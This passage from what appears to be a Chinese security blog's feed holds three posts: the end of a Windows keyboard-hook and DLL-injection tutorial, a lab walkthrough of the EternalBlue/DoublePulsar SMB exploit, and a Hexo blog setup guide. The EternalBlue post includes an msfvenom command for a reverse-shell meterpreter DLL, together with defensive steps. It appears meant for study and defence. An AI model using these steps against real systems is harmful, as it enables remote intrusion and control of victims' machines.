MB_OK);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">	 <span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>GetKeyNameTextA 用于获取按键名字符串。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">GetKeyNameText</span><span class="params">(</span></span></div><div class="line">  _In_  LONG   lParam,  </div><div class="line">  _Out_ LPTSTR lpString,  <span class="comment">// buffer to receive the key name</span></div><div class="line">  _In_  <span class="keyword">int</span>    cchSize    <span class="comment">// The maximum of the key name</span></div><div class="line">);</div></pre></td></tr></table></figure></p>
<p>CallNextHookEx 将消息继续传递给钩子链中下一个钩子函数，直到目标窗口。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">LRESULT WINAPI <span class="title">CallNextHookEx</span><span class="params">(</span></span></div><div class="line">  _In_opt_ HHOOK  hhk,    <span class="comment">// handle of hook</span></div><div class="line">  _In_     <span class="keyword">int</span>    nCode,</div><div class="line">  _In_     WPARAM wParam,</div><div class="line">  _In_     LPARAM lParam</div><div class="line">);</div></pre></td></tr></table></figure></p>
<h4 id="3）测试"><a href="#3）测试" class="headerlink" title="3）测试"></a><strong>3）测试</strong></h4><p>以上即为消息钩子相关的函数，下面调用这些函数测试键盘钩子的效果。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*funptr)</span><span class="params">()</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	HMODULE hDll = <span class="literal">NULL</span>;</div><div class="line">	funptr InstallHook = <span class="literal">NULL</span>;</div><div class="line">	funptr UninstallHook = <span class="literal">NULL</span>;</div><div class="line">	<span class="keyword">char</span> cmd[<span class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</div><div class="line"></div><div class="line">	<span class="built_in">printf</span>(<span class="string">"----------------------Command-----------------------\n\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[+] install : Install hook\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"[+] uninstall : Uninstall hook\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"----------------------------------------------------\n\n"</span>);</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">	&#123;</div><div class="line">		gets(cmd);</div><div class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(cmd ,<span class="string">"install"</span>))</div><div class="line">		&#123;</div><div class="line">			hDll = LoadLibraryA(<span class="string">"keyhook.dll"</span>);</div><div class="line">			<span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)</div><div class="line">			&#123;</div><div class="line">				<span class="built_in">printf</span>(<span class="string">"LoadLibrary Fail!\n"</span>);</div><div class="line">				<span class="keyword">return</span>;</div><div class="line">			&#125;</div><div class="line">			InstallHook = (funptr)GetProcAddress(hDll, <span class="string">"InstallHook"</span>);</div><div class="line">			UninstallHook = (funptr)GetProcAddress(hDll, <span class="string">"UninstallHook"</span>);</div><div class="line">			InstallHook();</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"Keyboard hook installed!\n\n"</span>);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(cmd, <span class="string">"uninstall"</span>))</div><div class="line">		&#123;</div><div class="line">			UninstallHook();</div><div class="line">			FreeLibrary(hDll);</div><div class="line">			<span class="built_in">printf</span>(<span class="string">"Sucess to uninstall hook!\n\n"</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在记事本中按下按键，弹出按键值。</p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-5-8/7397613-file_1494250200322_1341b.png" alt=""></p>
<p>查看记事本进程模块，可以看到 DLL 已成功注入该进程。</p>
<p><img src="http://ooyovxue7.bkt.clouddn.com/17-5-8/20626831-file_1494250203063_f29f.png" alt=""></p>
<h3 id="0x03-调试注入到进程中的-DLL"><a href="#0x03-调试注入到进程中的-DLL" class="headerlink" title="0x03 调试注入到进程中的 DLL"></a><strong>0x03 调试注入到进程中的 DLL</strong></h3><p>使用 OllyDbg 可以调试注入到目标进程中的 DLL 文件，具体步骤如下：</p>
<blockquote>
<p>1.运行 notepad.exe，使用 OD attach 运行中的 notepad；<br>2.选项/ 调试选项/ 事件/ 中断于新模块（dll）；<br>3.运行 Hook.exe，安装全局消息钩子；<br>4.在 notepad 中使用键盘输入，keyhook.dll 被注入到 notepad 中；<br>5.OD 暂停调试，并弹出 Executable modules 窗口；<br>6.取消之前设置的 “ 中断于新模块（dll）” ，双击 keyhook.dll 即可到达其 EP 地址处。</p>
</blockquote>
<hr>
<p>References:<br>[1] 逆向工程核心原理<br>[2] <a href="https://lellansin.wordpress.com/2013/08/15/windows-api-%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%83%EF%BC%89-hook-%E9%92%A9%E5%AD%90%E7%9B%91%E5%90%AC%EF%BC%88%E7%BC%96%E5%86%99%E4%B8%AD%EF%BC%89/" target="_blank" rel="external"> Windows API 教程（七）hook 钩子监听</a><br>[3] <a href="https://etenal.me/archives/844" target="_blank" rel="external">DLL注入浅析（上）</a></p>
]]></content>
      
        <categories>
            
            <category> Windows </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hook </tag>
            
            <tag> DLL 注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NSA Enternalblue + Doublepulsar 复现 SMB 漏洞]]></title>
      <url>/NSA%20Enternalblue+Doublepulsar%20%E5%A4%8D%E7%8E%B0%20SMB%20%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>2017年4月14日，Shadow Brokers 再次公开了大量从 NSA 的方程式组织（Equation Group）处窃取的攻击工具，这些工具主要针对 Windows 系统的漏洞，其中还有几个 0 day。工具中的 fuzzbunch 是一个类似于 metasploit 的漏洞利用框架，fb.py 是 fuzzbunch 的入口文件，通过该文件可以调用各攻击模块。</p>
<p>泄露的工具可在 Github 下载：<a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="external">https://github.com/misterch0c/shadowbroker</a></p>
<h3 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a><strong>0x01 影响范围</strong></h3><p>下图中列举了工具中相关模块所影响的服务和系统。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/92526918-file_1493343199647_16966.jpg" alt=""></p>
<h3 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a><strong>0x02 漏洞测试</strong></h3><p>下面使用工具中的 fuzzbunch 框架、Eternalblue 和 Doublepulsar 测试 Windows 下的 SMB 漏洞。首先通过 Eternalblue 利用 MS17-010 漏洞攻击 Windows 系统；然后在 Kali Linux 中用 Metasploit 生成一个能建立反向连接的 DLL，并在 Kali 中监听相应端口；最后使用 Doublepulsar 远程注入恶意 DLL 到目标系统，注入成功后 Kali 将与目标系统建立连接。</p>
<h4 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1. 测试环境"></a><strong>1. 测试环境</strong></h4><table>
<thead>
<tr>
<th style="text-align:left">PC</th>
<th style="text-align:left">IP</th>
<th>用途</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Win 7 x64</td>
<td style="text-align:left">192.168.109.1</td>
<td>攻击机</td>
<td>需安装 <a href="https://www.python.org/ftp/python/2.6.6/python-2.6.6.msi" target="_blank" rel="external">python2.6</a>  和 <a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download" target="_blank" rel="external">pywin32</a></td>
</tr>
<tr>
<td style="text-align:left">Win 7 x86</td>
<td style="text-align:left">192.168.109.132</td>
<td>靶机</td>
<td>开启 SMB 服务（445端口）</td>
</tr>
<tr>
<td style="text-align:left">Kali Linux</td>
<td style="text-align:left">192.168.109.128</td>
<td>控制端</td>
<td>生成payload 并控制回连会话</td>
</tr>
</tbody>
</table>
<p>首先需要把工具中的 windows 拷贝到攻击机 Win 7 x64中，然后在 windows 目录下新建一个 listeningposts 文件夹。</p>
<h4 id="2-测试流程"><a href="#2-测试流程" class="headerlink" title="2. 测试流程"></a><strong>2. 测试流程</strong></h4><h5 id="1）运行-fuzzbunch-框架"><a href="#1）运行-fuzzbunch-框架" class="headerlink" title="1）运行 fuzzbunch 框架"></a><strong>1）运行 fuzzbunch 框架</strong></h5><p>在 cmd 中进入 windows 目录，运行 <code>python fb.py</code>。输入目标系统 IP（Win 7 x86）和攻击机 IP（Win 7 x64），输入“no” 不重定向，接着输入项目名新建一个项目。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/95094523-file_1493344655277_8614.png" alt="">   </p>
<h5 id="2）调用-Eternalblue-攻击系统"><a href="#2）调用-Eternalblue-攻击系统" class="headerlink" title="2）调用 Eternalblue 攻击系统"></a><strong>2）调用 Eternalblue 攻击系统</strong></h5><p>运行<code>use Eternalblue</code>，然后大多数步骤只需按回车使用默认参数即可。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/54184530-file_1493344922256_adf5.png" alt=""><br>下面需要选择 <code>1）FB</code> 模式。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/61786740-file_1493345114952_f2f3.png" alt=""><br>接着继续回车，直到成功运行攻击模块。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/73280707-file_1493345362094_157db.png" alt=""></p>
<h5 id="3）Metasploit-生成恶意-DLL"><a href="#3）Metasploit-生成恶意-DLL" class="headerlink" title="3）Metasploit 生成恶意 DLL"></a><strong>3）Metasploit 生成恶意 DLL</strong></h5><p>在 Kali Linux 下使用 Metasploit 生成恶意 DLL,它将在目标系统中建立一个反向连接。这里生成的 DLL必须要与目标系统版本一致，下面生成 32 bit 的 DLL。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.109.128 LPORT=6666 -f dll &gt; test.dll</div></pre></td></tr></table></figure></p>
<p>之后需要将生成的 test.dll 拷贝到攻击机的 D:\下。</p>
<h5 id="4）开启-msf-监听"><a href="#4）开启-msf-监听" class="headerlink" title="4）开启 msf 监听"></a><strong>4）开启 msf 监听</strong></h5><p>在 Kali Linux 下，运行 msf，监听 6666 端口。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/80220500-file_1493346556508_101d9.png" alt="">   </p>
<h5 id="5）调用-Doublepulsar-注入-DLL"><a href="#5）调用-Doublepulsar-注入-DLL" class="headerlink" title="5）调用 Doublepulsar 注入 DLL"></a><strong>5）调用 Doublepulsar 注入 DLL</strong></h5><p>回到攻击机中，执行 <code>use Doublepulsar</code> ，回车使用默认参数直到选择 Function 为2 注入 DLL，然后指定 DLL 的路径。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/11038492-file_1493347262266_5c5.png" alt=""><br>注入成功后将返回如下信息。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/68357990-file_1493347997057_2e1f.png" alt=""><br>但是这里也会出现个问题，多次注入之后目标系统会出错重启。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/56721083-file_1493348716416_6f00.png" alt=""></p>
<h5 id="6）建立连接"><a href="#6）建立连接" class="headerlink" title="6）建立连接"></a><strong>6）建立连接</strong></h5><p>DLL 注入到目标系统之后，Kali Linux 将与目标系统建立连接。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/82624178-file_1493348105266_34db.png" alt=""></p>
<h3 id="0x03-防御措施"><a href="#0x03-防御措施" class="headerlink" title="0x03 防御措施"></a><strong>0x03 防御措施</strong></h3><h4 id="1-尽快升级系统补丁"><a href="#1-尽快升级系统补丁" class="headerlink" title="1. 尽快升级系统补丁"></a><strong>1. 尽快升级系统补丁</strong></h4><h4 id="2-开启防火墙，并限制-445-端口"><a href="#2-开启防火墙，并限制-445-端口" class="headerlink" title="2. 开启防火墙，并限制 445 端口"></a><strong>2. 开启防火墙，并限制 445 端口</strong></h4><p>通过以下命令添加防火墙规则：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall firewall add rule name=&quot;445&quot; protocol=TCP dir=in localport=445 action=block</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="http://blog.injectxx.com/2017/04/18/%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0%E3%80%82/" target="_blank" rel="external">NSA工具包之0day Eternalblue 复现笔记</a><br>[2] <a href="https://www.exploit-db.com/docs/41896.pdf" target="_blank" rel="external">HOW TO EXPLOIT ETERNALBLUE &amp; DOUBLEPULSAR TO GET AN<br>EMPIRE/METERPRETER SESSION ON WINDOWS 7/2008</a><br>[3] <a href="https://www.vulbox.com/knowledge/detail/?id=6" target="_blank" rel="external">NSA Fuzzbunch分析与利用案例</a></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Enternalblue </tag>
            
            <tag> Doublepulsar </tag>
            
            <tag> NSA </tag>
            
            <tag> SMB </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Github+Hexo+NexT搭建个人博客]]></title>
      <url>/Github+Hexo+NexT%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<p>平时在网上查文档的时候经常能看到一些非常好的博客，然后就想着自己也搭一个，一方面可以记录一些问题的解决方法，以便查阅，另一方面希望能促使自己多总结，多写文档。所以，经过这几天的折腾，终于把基本功能都搭好了。下面是搭建过程的记录，以下操作在 ubuntu14.04 x86_64中进行。</p>
<h3 id="0x01-安装Node-js"><a href="#0x01-安装Node-js" class="headerlink" title="0x01 安装Node.js"></a><strong>0x01 安装Node.js</strong></h3><h4 id="1）通过nvm安装Node-js"><a href="#1）通过nvm安装Node-js" class="headerlink" title="1）通过nvm安装Node.js"></a><strong>1）通过nvm安装Node.js</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | sh</div><div class="line">$ nvm ls-remote</div><div class="line">$ nvm install v7.9.0</div></pre></td></tr></table></figure>
<h4 id="2）测试"><a href="#2）测试" class="headerlink" title="2）测试"></a><strong>2）测试</strong></h4><p>安装完后可以新建一个简单的 hello.js 测试是否安装成功，hello.js 代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var http = require(&apos;http&apos;);</div><div class="line">http.createServer(function(req, res)&#123;</div><div class="line">    res.writeHead(200, &#123;&apos;Content-Type&apos;: &apos;text/plain&apos;&#125;);</div><div class="line">    res.end(&apos;Hello World\n&apos;);</div><div class="line">&#125;).listen(8808, &apos;127.0.0.1&apos;);</div><div class="line">console.log(&apos;Server running at http://127.0.0.1:8808&apos;);</div></pre></td></tr></table></figure></p>
<p>进入该文件所在目录，在终端输入<code>node hello_node.js</code>，然后用浏览器打开<code>http://127.0.0.1:8808</code> 即可看到 “Hello Word”。</p>
<h3 id="0x02-安装与配置Github"><a href="#0x02-安装与配置Github" class="headerlink" title="0x02 安装与配置Github"></a><strong>0x02 安装与配置Github</strong></h3><h4 id="1）安装Git"><a href="#1）安装Git" class="headerlink" title="1）安装Git"></a><strong>1）安装Git</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install git-core</div></pre></td></tr></table></figure>
<h4 id="2）配置ssh-keys"><a href="#2）配置ssh-keys" class="headerlink" title="2）配置ssh keys"></a><strong>2）配置ssh keys</strong></h4><p>首先检查现有的 ssh key：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cd ~/.ssh</div></pre></td></tr></table></figure></p>
<p>如果没有 key 则生成新的 ssh key：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ ssh-keygen -t rsa -C &quot;your email@163.com&quot;</div><div class="line">Generating public/private rsa key pair.</div><div class="line">Enter file in which to save the key (/home/xx/.ssh/id_rsa):</div></pre></td></tr></table></figure></p>
<p>按回车键后提示输入密码，该密码用于提交项目时的验证，可防止别人往你的项目里提交内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Enter passphrase (empty for no passphrase):</div><div class="line">Enter same passphrase again:</div></pre></td></tr></table></figure></p>
<p>成功生成 ssh key 之后可以看到以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ls</div><div class="line">id_rsa  id_rsa.pub  known_hosts</div></pre></td></tr></table></figure></p>
<p>在本地生成 ssh key 后需要添加到 Github 上，点击<code>Setting-&gt;SSH and GPG keys-&gt;New SSH key</code>，将 id_rsa.pub 中的内容复制到Key中。</p>
<h4 id="3）测试"><a href="#3）测试" class="headerlink" title="3）测试"></a><strong>3）测试</strong></h4><p>配置好后可以测试一下，执行 <code>$ ssh -T git@github.com</code>，若返回以下内容则配置成功！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hi xx! You&apos;ve successfully authenticated, but GitHub does not provide shell access.</div></pre></td></tr></table></figure></p>
<h4 id="4）设置用户信息"><a href="#4）设置用户信息" class="headerlink" title="4）设置用户信息"></a><strong>4）设置用户信息</strong></h4><p>Git 会根据用户的名字和邮箱来记录提交。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ git config --global user.name &quot;your name&quot;</div><div class="line">$ git config --global user.email &quot;your email on github&quot;</div></pre></td></tr></table></figure></p>
<h3 id="0x03-安装与配置Hexo"><a href="#0x03-安装与配置Hexo" class="headerlink" title="0x03 安装与配置Hexo"></a><strong>0x03 安装与配置Hexo</strong></h3><h4 id="1）安装-Hexo"><a href="#1）安装-Hexo" class="headerlink" title="1）安装 Hexo"></a><strong>1）安装 Hexo</strong></h4><p>进入需建立博客的目录，输入以下命令安装Hexo：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-cli -g</div></pre></td></tr></table></figure></p>
<p>以后可以使用<code>$ nmp update hexo –g</code>命令更新Hexo。</p>
<h4 id="2）初始化"><a href="#2）初始化" class="headerlink" title="2）初始化"></a><strong>2）初始化</strong></h4><p>安装 Hexo 完成后，在当前博客目录下列命令，Hexo 将会在指定文件夹中新建所需要的文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ hexo init &lt;folder&gt;</div><div class="line">$ cd &lt;folder&gt;</div><div class="line">$ npm install</div></pre></td></tr></table></figure></p>
<p>初始化完成后，指定文件夹的目录如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── _config.yml	// 网站的 配置信息，可以在此配置大部分的参数</div><div class="line">├── package.json	// 应用程序的信息</div><div class="line">├── scaffolds	// 模版文件夹。新建文章时，Hexo 会根据 scaffold 来建立文件</div><div class="line">├── source		// 资源文件夹是存放用户资源的地方</div><div class="line">|   ├── _drafts</div><div class="line">|   └── _posts</div><div class="line">└── themes	// 主题 文件夹。Hexo 会根据主题来生成静态页面</div></pre></td></tr></table></figure></p>
<h4 id="3）测试-1"><a href="#3）测试-1" class="headerlink" title="3）测试"></a><strong>3）测试</strong></h4><p>配置好后启动服务器，在浏览器中访问<code>http://localhost:4000/</code>可以看到一篇默认文章。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div><div class="line">INFO  Start processing</div><div class="line">INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.</div></pre></td></tr></table></figure></p>
<h3 id="0x04-部署到Github"><a href="#0x04-部署到Github" class="headerlink" title="0x04 部署到Github"></a><strong>0x04 部署到Github</strong></h3><h4 id="1）创建github仓库"><a href="#1）创建github仓库" class="headerlink" title="1）创建github仓库"></a><strong>1）创建github仓库</strong></h4><p>点击右上角“+”-&gt; new repository，输入Repository name 为<code>yourname.github.io</code>，yourname 必须与 git 用户名一致，并且这将会是 blog 的域名。</p>
<h4 id="2）修改配置文件"><a href="#2）修改配置文件" class="headerlink" title="2）修改配置文件"></a><strong>2）修改配置文件</strong></h4><p>修改_config.yml文件中的参数，将Hexo与github上的仓库关联。修改如下，注意冒号后面有一个空格：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># Deployment</div><div class="line">## Docs: https://hexo.io/docs/deployment.html</div><div class="line">deploy:</div><div class="line">  type: git</div><div class="line">  repo: https://github.com/yourname/yourname.github.io</div><div class="line">  branch: master</div><div class="line">  message:</div></pre></td></tr></table></figure></p>
<p>参数描述：</p>
<table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">repo</td>
<td style="text-align:left">库（Repository）地址</td>
</tr>
<tr>
<td style="text-align:left">branch</td>
<td style="text-align:left">分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。</td>
</tr>
<tr>
<td style="text-align:left">message</td>
<td style="text-align:left">自定义提交信息 ( 默认为 Site updated:now(‘YYYY-MM-DD HH:mm:ss’))</td>
</tr>
</tbody>
</table>
<h4 id="3）安装-hexo-deployer-git"><a href="#3）安装-hexo-deployer-git" class="headerlink" title="3）安装 hexo-deployer-git"></a><strong>3）安装 hexo-deployer-git</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>
<h4 id="4）部署到github"><a href="#4）部署到github" class="headerlink" title="4）部署到github"></a><strong>4）部署到github</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div><div class="line">INFO  Start processing</div><div class="line">...</div><div class="line">INFO  Deploy done: git</div></pre></td></tr></table></figure>
<p>成功后就可以通过浏览器访问<code>https://yourname.github.io/</code>。</p>
<h3 id="0x05-使用NexT主题"><a href="#0x05-使用NexT主题" class="headerlink" title="0x05 使用NexT主题"></a><strong>0x05 使用NexT主题</strong></h3><p>Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 themes 目录下， 然后修改下配置文件即可。</p>
<h4 id="1）下载主题"><a href="#1）下载主题" class="headerlink" title="1）下载主题"></a><strong>1）下载主题</strong></h4><p>下载完后复制到themes目录下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/iissnan/hexo-theme-next.git</div></pre></td></tr></table></figure></p>
<h4 id="2）修改配置文件-1"><a href="#2）修改配置文件-1" class="headerlink" title="2）修改配置文件"></a><strong>2）修改配置文件</strong></h4><p>打开 Blog 目录下站点配置文件 _config.yml，将 theme 修改给主题文件夹名称。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Extensions</div><div class="line">## Plugins: https://hexo.io/plugins/</div><div class="line">## Themes: https://hexo.io/themes/</div><div class="line">theme: next</div></pre></td></tr></table></figure></p>
<h4 id="3）测试-2"><a href="#3）测试-2" class="headerlink" title="3）测试"></a><strong>3）测试</strong></h4><p>执行 <code>$ hexo s --debug</code> 验证主题是否启用，在浏览器中访问<code>http://localhost:4000</code>，查看效果。</p>
<h3 id="0x06主题优化"><a href="#0x06主题优化" class="headerlink" title="0x06主题优化"></a><strong>0x06主题优化</strong></h3><p>主题目录下同样有一个配置文件 _config.yml，可以修改相关参数对主题做修改。</p>
<h4 id="选择外观"><a href="#选择外观" class="headerlink" title="选择外观"></a><strong>选择外观</strong></h4><p>找到 Scheme 可以选择不同的外观。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Schemes</div><div class="line">#scheme: Muse</div><div class="line">scheme: Mist</div><div class="line">#scheme: Pisces</div></pre></td></tr></table></figure></p>
<h4 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a><strong>设置语言</strong></h4><p>打开站点配置文件，修改 language 字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">language: en</div></pre></td></tr></table></figure></p>
<h4 id="设置头像"><a href="#设置头像" class="headerlink" title="设置头像"></a><strong>设置头像</strong></h4><p>将头像放置主题目录下的 <code>source/uploads/</code>，修改 avatar 字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">avatar: /uploads/avatar.jpg</div></pre></td></tr></table></figure></p>
<h4 id="设置RSS"><a href="#设置RSS" class="headerlink" title="设置RSS"></a><strong>设置RSS</strong></h4><p>1）安装插件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-generator-feed</div></pre></td></tr></table></figure></p>
<p>2）设置站点配置文件，添加以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># Plugins</div><div class="line">## RSS</div><div class="line">feed:</div><div class="line">  type: atom	#feed type: atom or rss2</div><div class="line">  path: atom.xml	#feed path</div><div class="line">  limit: 20</div><div class="line">  hub:</div><div class="line">  content:</div></pre></td></tr></table></figure></p>
<h4 id="添加标签-tags-页面"><a href="#添加标签-tags-页面" class="headerlink" title="添加标签[tags]页面"></a><strong>添加标签[tags]页面</strong></h4><p>1）首先，执行<code>$ hexo new page tags</code> 新建tags 页面，然后修改刚新建的页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">title: tags</div><div class="line">date: 2017-04-19 21:18:05</div><div class="line">type: &quot;tags&quot;</div><div class="line">comments: false</div><div class="line">---</div></pre></td></tr></table></figure></p>
<p>2）编辑文章时，通过以下方式设置文章标签：<br><code>tages: [标签1,标签2,...标签n]</code></p>
<h4 id="添加分类-categories-页面"><a href="#添加分类-categories-页面" class="headerlink" title="添加分类[categories]页面"></a><strong>添加分类[categories]页面</strong></h4><p>执行<code>$ hexo new page tags</code> 新建一个页面，然后修改刚新建的页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">title: categories</div><div class="line">date: 2017-04-19 21:25:38</div><div class="line">type: &quot;catgories&quot;</div><div class="line">comments: false</div><div class="line">---</div></pre></td></tr></table></figure></p>
